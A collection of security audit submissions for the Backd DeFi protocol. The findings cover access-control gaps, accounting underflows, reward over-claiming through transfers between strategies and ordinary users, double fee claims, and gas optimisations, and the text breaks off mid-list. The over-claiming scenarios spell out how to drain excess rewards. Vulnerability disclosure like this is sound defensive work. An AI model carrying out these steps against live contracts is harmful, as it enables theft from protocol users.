  3. executeKeeperPoolWeight() and batchExecuteKeeperPoolWeights() functions in InflationManager.sol must have some role restrictions. There are 2 other functions. executeLpPoolWeight(), executeAmmTokenWeight().  contracts\tokenomics\InflationManager.sol#L151 contracts\tokenomics\InflationManager.sol#L241 contracts\tokenomics\InflationManager.sol#L326  With the above functions, the batch functions have the modifier "onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)". I think the above functions should have the same modifier also.   4. claim() function in VestedEscrow.sol should have nonReentrant modifier same as other claim() function at L138.  contracts\tokenomics\VestedEscrow.sol#L113-L115  Otherwise, you can change the function like this(same as VestedEscrowRevocable.sol).  function claim() external virtual override {      claim(msg.sener); }
# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L98-L102 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L342-L346 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L391-L395   # Vulnerability details  ## Impact StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked.  ## Proof of Concept Currently it saves totalStaked for strategies and non-strategies separately. uint underflow error could be occured in these cases.  Scenario 1. 1. Address A(non-strategy) stakes some amount x and it will be added to StakerVault_poolTotalStaked. 2. This address A is approved as a strategy by StakerVault.inflationManager. 3. Address A tries to unstake amount x, it will be deducted from StakerVault.strategiesTotalStaked because this address is a strategy already. Even if it would succeed for this strategy but it will revert for other strategies because StakerVault.strategiesTotalStaked is less than correct staked amount for strategies.  Scenario 2. There is a transfer between strategy and non-strategy using StakerVault.transfer(), StakerVault.transferFrom() functions. In this case, StakerVault.strategiesTotalStaked and StakerVault._poolTotalStaked must be changed accordingly but there is no such logic.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps You need to modify 3 functions. StakerVault.addStrategy(), StakerVault.transfer(), StakerVault.transferFrom().  1. You need to move staked amount from StakerVault._poolTotalStaked to StakerVault.strategiesTotalStaked every time when StakerVault.inflationManager approves a new strategy. You can modify addStrategy() at L98-L102 like this.  function addStrategy(address strategy) external override returns (bool) {     require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);     require(!strategies[strategy], Error.ADDRESS_ALREADY_SET);      strategies[strategy] = true;     _poolTotalStaked -= balances[strategy];     strategiesTotalStaked += balances[strategy];      return true; }  2. You need to add below code at L126 of transfer() function.  if(strategies[msg.sender] != strategies[account]) {     if(strategies[msg.sender]) { // from strategy to non-strategy         _poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  3. You need to add below code at L170 of transferFrom() function.  if(strategies[src] != strategies[dst]) {     if(strategies[src]) { // from strategy to non-strategy         _poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  
# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L70-L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L302-L322   # Vulnerability details  ## Impact Users can claim more fees than expected if governance migrates current rewardToken again by fault.  ## Proof of Concept In the migrate() function, there is no requirement newRewardToken != rewardToken. If this function is called with the same "rewardToken" parameter, "_replacedRewardTokens" will contain the current "rewardToken" also. Then when the user claims fees, "userShares" will be added two times for the same token at L302-L305, L314-L317. It's because "curRewardTokenData.userFeeIntegrals[user]" is updated at L332 after the "userShares" calculation for past rewardTokens. So the user can get paid more fees than he should.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps You need to add this require() at L71.  require(newRewardToken != rewardToken, Error.SAME_AS_CURRENT);  
# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L95 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L52-L63   # Vulnerability details  ## Impact Strategy in StakerVault.sol can steal more rewards even though it's designed strategies shouldn't get rewards. Also there will be a problem with a rewarding system in LpGauge.sol so that some normal users wouldn't get rewards properly.   ## Proof of Concept 1. Strategy A staked amount x and x will be added to StakerVault.strategiesTotalStaked. contracts\StakerVault.sol#L312 2. Strategy A transferred the amount x to non-strategy B and StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked won't be updated. contracts\StakerVault.sol#L111 3. After some time for the larger LpGauge.poolStakedIntegral, B claims rewards using the LpGauge.claimRewards() function. contracts\tokenomics\LpGauge.sol#L52  Inside LpGauge.userCheckPoint(), it's designed not to calculate LpGauge.perUserShare for strategy, but it will pass this condition because B is not a strategy. contracts\tokenomics\LpGauge.sol#L90  Furthermore, when calculate rewards, LpGauge.poolStakedIntegral will be calculated larger than a normal user stakes same amount. It's because StakerVault._poolTotalStaked wasn't updated when A transfers x amount to B so LpGauge.poolTotalStaked is less than correct value. contracts\tokenomics\LpGauge.sol#L113-L117  Finally B can get more rewards than he should and the reward system will pay more rewards than it's designed.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think there will be two methods to fix. Method 1 is to forbid a transfer between strategy and non-strategy so that strategy can't move funds to non-strategy. Method 2 is to update StakerVault.strategiesTotalStaked and StakerVault._poolTotalStaked correctly so that strategy won't claim more rewards than he should even though he claims rewards using non-strategy.  Method 1. You need to modify two functions. StakerVault.transfer(), StakerVault.transferFrom().  1. You need to add this require() at L112 for transfer(). require(strategies[msg.sender] == strategies[account], Error.FAILED_TRANSFER);  2. You need to add this require() at L144 for transferFrom(). require(strategies[src] == strategies[dst], Error.FAILED_TRANSFER);  Method 2. I've explained about this method in my medium risk report "StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked" I will copy the same code for your convenience.  You need to modify 3 functions. StakerVault.addStrategy(), StakerVault.transfer(), StakerVault.transferFrom().  1. You need to move staked amount from StakerVault._poolTotalStaked to StakerVault.strategiesTotalStaked every time when StakerVault.inflationManager approves a new strategy. You can modify addStrategy() at L98-L102 like this.  function addStrategy(address strategy) external override returns (bool) {     require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);     require(!strategies[strategy], Error.ADDRESS_ALREADY_SET);      strategies[strategy] = true;     _poolTotalStaked -= balances[strategy];     strategiesTotalStaked += balances[strategy];      return true; }  2. You need to add below code at L126 of transfer() function.  if(strategies[msg.sender] != strategies[account]) {     if(strategies[msg.sender]) { // from strategy to non-strategy         _poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  3. You need to add below code at L170 of transferFrom() function.  if(strategies[src] != strategies[dst]) {     if(strategies[src]) { // from strategy to non-strategy         _poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  
  ## Using != 0 is cheaper than > 0 when used on a uint in a require() statement with the optimizer enabled  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91-L92 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L84     ## Unnecessary variable definition in BkdLocker.sol, executeUnlocks() function  "length" is assigned to "i" and "i" is used for further operations, however "length" is never accessed again. Therefore, "length" can be directly used. Can be changed from this: ~~~         uint256 i = length;     //@audit gas no need to assign to i, directly use length         while (i > 0) {             i = i - 1;             if (stashedWithdraws[i].releaseTime <= block.timestamp) {                 totalAvailableToWithdraw += stashedWithdraws[i].amount;                  stashedWithdraws[i] = stashedWithdraws[stashedWithdraws.length - 1];                  stashedWithdraws.pop();             }         } ~~~ To this: ~~~         while (length > 0) {             length--;             if (stashedWithdraws[length].releaseTime <= block.timestamp) {                 totalAvailableToWithdraw += stashedWithdraws[length].amount;                  stashedWithdraws[length] = stashedWithdraws[stashedWithdraws.length - 1];                  stashedWithdraws.pop();             }         } ~~~     ## for index can be made unchecked  All the for indexes are made unchecked except this one.  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22     ## Redundant initialisation to default value  keeperGaugeExists initialised with default value.   ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L412      ## Public state variables and immutables can be made private  Most of the public state variables, immutables and constants do not need to be public. Hence, they can be private to save gas.  ### Lines of code There are many instances, for example; https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L25-L53 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L25-L32     ## Execution of strict inequalities are cheaper than non-strict inequalities  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L24 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L190     ## Prefix increment/decrements are cheaper than postfix  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L98   
 ## Each event can have up to three indexed fields.  The address arguments of the below events can be made indexed.  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/interfaces/vendor/ICvxLocker.sol#L54 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L58 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L18     ## Use scientific notation (for example; 1E9) for large multiples of 10 to improve readability  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L10-L12     ## Missing NatSpec comments  Many functions have no NatSpec comments at all. Even the functions which have NatSpec comments are missing @param, @return values.  ### Lines of code Just a few examples. Below functions have no NatSpec: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L110 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L16 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L56 
# gas opt `object`++ cost more then ++`object` . (same for --)  `object`+ 1 cost more then ++`object` .  caculate with unchecked cost less.   ## BkdLocker.sol  ``` line 140 - i = i - 1; ```  ``` fix - unchecked{ --i; } ``` 
1. Unused contracts and libraries are imported. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L4  Recommendation: Remove unused libraries.  2. Checkpoint executed twice when kill the gauge. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L427-L428  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L461-L462  `InflationManager` call `poolCheckPoint()`, then call `kill()` function, but inside of `kill()` function, `poolCheckPoint()` will be executed again.  Recommendation: Remove `poolCheckPoint()` call before kill.  3. Cache array length before loop to reduce gas cost Cache length of array and use it in the loop is a good solution to reduce gas. Other wise, it will always trying to load length from storage in every loop.  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L116  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82   Recommendation Cache length of array and use it in loop.  4. Use `!=0` instead of `>0` for uint non zero check. In most of places, there is something like `a > 0` for non-zero check. For Uint variables, there is no negative value, so it’s enough to change to `a != 0`.  Ex. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140  Recommendation: Use non-equal operator instead of greater operator for non-zero check.  5. `lastEvent` in `Minter.sol` can be update multiple times. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L222  `_mint` function update `lastEvent` twice – first update in Line 222, and second update inside `executeInflationRateUpdate()`  Recommendation: Optimize code to avoid multiple updates.  6. Use interface contract for external calls. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L56  There is a `IBkdToken` interface, but now it is using `BkdToken` (implementation contract) for external calls. This increase contract size.  Recommendation: Use interface for external calls. 
1. Some functions have unused return value. Most of functions have `bool` return value to indicate success or failure. But the following functions return always true or revert transaction, so the return value is meaning less. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L49-L54  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L72-L90   Recommendation: Return false for special conditions, or remove return value.  2. `reportFees()` function of `KeeperGauge.sol` needs to have zero amount check. There is no zero amount check in `reportFees()` function, thus `beneficiary`’s `firstEpochSet` and `nextEpochToClaim` will be initialized, and this lead high gas cost in claim function.  Recommendation: Check zero amount to avoid updating data and wasting gas. 
## Low Risk Vulnerabilities ### 1. No function to remove gauge from whitelist If governance mistakenly whitelisted a faulty/malicious gauge, there is no way to remove it.  A malicious gauge could mint as much $BKD as it's currently available according to the inflation schedule, in detriment of other gauges' allocation.  #### Recommended Mitigation Steps Unless there's a reason not to, consider adding a function to remove gauge from whitelist in `InflationManager.sol`: ``` function blacklistGauge(address gauge)      external      override      onlyRoles(Roles.GOVERNANCE) {     gauges[gauge] = false; } ``` #### Related Links - https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L80-L82 - https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L181-L183 
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L609-L618 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpActionFeeHandler.sol#L95-L98 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpAction.sol#L807 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpAction.sol#L653   # Vulnerability details  ## Impact When `_removeKeeperGauge` is called, there is no guarantee that the keeper gauge isn't currently in use by any `TopUpActionFeeHandler`. If it's still in use, any top up action executions will be disabled as reporting fees in `KeeperGauge.sol` will revert: ``` function reportFees(     address beneficiary,     uint256 amount,     address lpTokenAddress ) external override returns (bool) {     ...     require(!killed, Error.CONTRACT_PAUSED); // gauge is killed by InflationManager     ...     return true; } ``` If this happened during extreme market movements, some positions that require a top up will not be executed and be in risk of being liquidated.  ## Proof of Concept - Alice registers a top up action. - Governance calls `InflationManager.removeKeeperGauge`, replacing an old keeper gauge. However, governance forgot to call `TopUpActionFeeHandler.prepareKeeperGauge` so `TopUpActionFeeHandler.getKeeperGauge` still points to the killed gauge. - Market moved and Alice's position should now be executed by keepers, however any attempt to execute will revert:     ```     > Keeper calls TopUpAction.execute();     > _payFees();     > IActionFeeHandler(feeHandler).payFees();     > IKeeperGauge(keeperGauge).reportFees();     > reverts as gauge is already killed     ``` - Governance noticed and calls `prepareKeeperGauge`  with a 3 days delay. - Alice's position got liquidated before the change is executed.  ## Recommended Mitigation Steps Consider adding an on-chain check to ensure that the keeper gauge is not in use before removing them.   
**Table of Contents:**  - [Cheap Contract Deployment Through Clones](#cheap-contract-deployment-through-clones) - [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof) - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops) - [`++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)](#i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1) - [Increments can be unchecked in for-loops](#increments-can-be-unchecked-in-for-loops) - [No need to explicitly initialize variables with default values](#no-need-to-explicitly-initialize-variables-with-default-values) - [Reduce the size of error messages (Long revert Strings)](#reduce-the-size-of-error-messages-long-revert-strings) - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)  ## Cheap Contract Deployment Through Clones  See `@audit` tag:  ```solidity tokenomics/VestedEscrow.sol:99:                holdingAddress = address(new EscrowTokenHolder(address(rewardToken))); tokenomics/VestedEscrowRevocable.sol:44:        holdingContract[treasury_] = address(new EscrowTokenHolder(rewardToken_)); ```  There's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .  This is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:  - <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516> - <https://github.com/porter-finance/v1-core/pull/34>  I suggest applying a similar pattern.  ## `> 0` is less efficient than `!= 0` for unsigned integers (with proof)  `!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)  Proof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>  I suggest changing `> 0` with `!= 0` here:  ```solidity protocol/contracts/BkdLocker.sol:    91:         require(amount > 0, Error.INVALID_AMOUNT);    92:         require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);   137:         require(length > 0, "No entries");  protocol/contracts/tokenomics/AmmConvexGauge.sol:   158:         require(amount > 0, Error.INVALID_AMOUNT);   171:         require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/AmmGauge.sol:   104:         require(amount > 0, Error.INVALID_AMOUNT);   125:         require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/KeeperGauge.sol:   140:         require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED);  protocol/contracts/tokenomics/VestedEscrow.sol:   84:         require(unallocatedSupply > 0, "No reward tokens in contract"); ```  Also, please enable the Optimizer.  ## An array's length should be cached to save gas in for-loops  Reading array length at each iteration of the loop consumes more gas than necessary.    In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Here, I suggest storing the array's length in a variable before the for-loop, and use this new variable instead:  ```solidity access/RoleManager.sol:82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { tokenomics/FeeBurner.sol:56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { tokenomics/InflationManager.sol:116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { zaps/PoolMigrationZap.sol:39:        for (uint256 i; i < oldPoolAddresses_.length; ) { RewardHandler.sol:42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { StakerVault.sol:259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```  ## `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)  Pre-increments and pre-decrements are cheaper.  For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1` - `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)  **Decrement:**  - `i -= 1` is the most expensive form - `i--` costs 11 gas less than `i -= 1` - `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name *post-increment*:  ```solidity uint i = 1;   uint j = 2; require(j == i++, "This will be false as i is incremented after the comparison"); ```    However, pre-increments (or pre-decrements) return the new value:    ```solidity uint i = 1;   uint j = 2; require(j == ++i, "This will be true as i is incremented before the comparison"); ```    In the pre-increment case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`.      Affected code:    ```solidity tokenomics/KeeperGauge.sol:59:        epoch++; tokenomics/KeeperGauge.sol:98:        epoch++; ```  Consider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).  ## Increments can be unchecked in for-loops  In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.      [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)  Affected code:    ```solidity zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { ```  The change would be:      ```diff - for (uint256 i; i < numIterations; ++i) { + for (uint256 i; i < numIterations;) {  // ...   +   unchecked { ++i; } }   ```  The risk of overflow is non-existant for `uint256` here.  ## No need to explicitly initialize variables with default values  If a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`  Affected code:  ```solidity tokenomics/InflationManager.sol:412:        bool keeperGaugeExists = false; ```  I suggest removing explicit initializations for default values.  ## Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  Revert strings > 32 bytes:  ```solidity tokenomics/Minter.sol:152:            "Maximum non-inflation amount exceeded." //@audit size 38 ```  I suggest shortening the revert strings to fit in 32 bytes.  ## Use Custom Errors instead of Revert Strings to save Gas  Solidity 0.8.4 introduced custom errors. They are more gas efficient than revert strings, when it comes to deploy cost as well as runtime cost when the revert condition is met. Use custom errors instead of revert strings for gas savings.  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert("Insufficient funds.");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).  I suggest replacing all revert strings with custom errors in the solution.  ```solidity access/AuthorizationBase.sol:17:        require(_roleManager().hasRole(role, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:25:        require(_roleManager().hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:33:        require(_roleManager().hasAnyRole(role1, role2, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:45:        require( access/RoleManager.sol:28:        require(hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); access/RoleManager.sol:46:        require(getRoleMemberCount(Roles.GOVERNANCE) > 1, Error.CANNOT_REVOKE_ROLE); access/RoleManager.sol:112:        require(role != Roles.GOVERNANCE, Error.CANNOT_REVOKE_ROLE); access/RoleManager.sol:113:        require(hasRole(role, account), Error.INVALID_ARGUMENT); tokenomics/AmmConvexGauge.sol:65:        require( tokenomics/AmmConvexGauge.sol:87:        require(inflationRecipient == address(0), Error.ADDRESS_ALREADY_SET); tokenomics/AmmConvexGauge.sol:93:        require(inflationRecipient != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmConvexGauge.sol:172:        require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); tokenomics/AmmGauge.sol:50:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/AmmGauge.sol:57:        require( tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmGauge.sol:126:        require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); tokenomics/BkdToken.sol:31:        require(msg.sender == minter, Error.UNAUTHORIZED_ACCESS); tokenomics/FeeBurner.sol:49:        require(tokens_.length != 0, "No tokens to burn"); tokenomics/FeeBurner.sol:75:        require(burningEth_ || msg.value == 0, Error.INVALID_VALUE); tokenomics/InflationManager.sol:48:        require(gauges[msg.sender], Error.UNAUTHORIZED_ACCESS); tokenomics/InflationManager.sol:59:        require(minter == address(0), Error.ADDRESS_ALREADY_SET); tokenomics/InflationManager.sol:60:        require(_minter != address(0), Error.INVALID_MINTER); tokenomics/InflationManager.sol:95:        require(!weightBasedKeeperDistributionDeactivated, "Weight-based dist. deactivated."); tokenomics/InflationManager.sol:139:        require(_keeperGauges.contains(pool), Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:171:        require(length == weights.length, Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:174:            require(_keeperGauges.contains(pools[i]), Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:229:        require(gauges[IStakerVault(stakerVault).getLpGauge()], Error.GAUGE_DOES_NOT_EXIST); tokenomics/InflationManager.sol:244:        require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:265:        require(length == weights.length, "Invalid length of arguments"); tokenomics/InflationManager.sol:270:            require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:295:            require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:315:        require(_ammGauges.contains(token), "amm gauge not found"); tokenomics/InflationManager.sol:365:        require(length == weights.length, "Invalid length of arguments"); tokenomics/InflationManager.sol:367:            require(_ammGauges.contains(tokens[i]), "amm gauge not found"); tokenomics/InflationManager.sol:424:        require(!exists || keeperGauge != _keeperGauge, Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:452:        require(IAmmGauge(_ammGauge).isAmmToken(token), Error.ADDRESS_NOT_WHITELISTED); tokenomics/InflationManager.sol:484:        require(addressProvider.isStakerVault(msg.sender, lpToken), Error.UNAUTHORIZED_ACCESS); tokenomics/InflationManager.sol:486:        require(lpGauge != address(0), Error.GAUGE_DOES_NOT_EXIST); tokenomics/InflationManager.sol:621:        require( tokenomics/KeeperGauge.sol:40:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/KeeperGauge.sol:78:        require( tokenomics/KeeperGauge.sol:82:        require(!killed, Error.CONTRACT_PAUSED); tokenomics/KeeperGauge.sol:126:        require( tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); tokenomics/LpGauge.sol:31:        require(_stakerVault != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/LpGauge.sol:35:        require(address(_inflationManager) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/LpGauge.sol:53:        require( tokenomics/Minter.sol:72:        require(_annualInflationDecayLp < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:73:        require(_annualInflationDecayKeeper < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:74:        require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:100:        require(address(token) == address(0), "Token already set!"); tokenomics/Minter.sol:105:        require(lastEvent == 0, "Inflation has already started."); tokenomics/Minter.sol:132:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/Minter.sol:150:        require( tokenomics/Minter.sol:220:        require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded"); tokenomics/VestedEscrow.sol:57:        require(starttime_ >= block.timestamp, "start must be future"); tokenomics/VestedEscrow.sol:58:        require(endtime_ > starttime_, "end must be greater"); tokenomics/VestedEscrow.sol:69:        require(_admin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/VestedEscrow.sol:70:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:75:        require(_fundadmin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/VestedEscrow.sol:76:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:81:        require(msg.sender == admin, 